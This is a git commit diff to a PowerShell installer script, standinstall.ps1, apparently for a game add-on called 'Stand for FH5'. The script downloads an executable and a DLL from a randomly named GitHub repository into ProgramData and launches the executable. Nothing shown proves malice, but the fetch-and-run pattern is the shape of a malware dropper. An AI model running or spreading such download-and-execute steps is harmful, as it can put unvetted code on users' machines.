212f91f3543fe258b14dc40737c6ed6478d5203c
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-01-14 14:52:26 -0500

    Update standinstall.ps1

--- standinstall.ps1
+++ standinstall.ps1
@@ -1,14 +1,16 @@
-﻿$source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Stand%20for%20FH5.exe"
+﻿mkdir "C:\ProgramData\STANDFH5"
+ 
+ $source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Stand%20for%20FH5.exe"
 
-$destination = "$env:USERPROFILE\AppData\Local\Temp\Stand fo FH5.exe"
+$destination = "C:\ProgramData\STANDFH5\Stand fo FH5.exe"
 
 Invoke-WebRequest -Uri $source -OutFile $destination
 
 $source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Backend.dll"
 
-$destination = "$env:USERPROFILE\AppData\Local\Temp\backend.dll"
+$destination = "C:\ProgramData\STANDFH5\backend.dll"
 
 Invoke-WebRequest -Uri $source -OutFile $destination
 
-start "$env:USERPROFILE\AppData\Local\Temp\Stand fo FH5.exe"
+start "C:\ProgramData\STANDFH5\Stand fo FH5.exe"
 
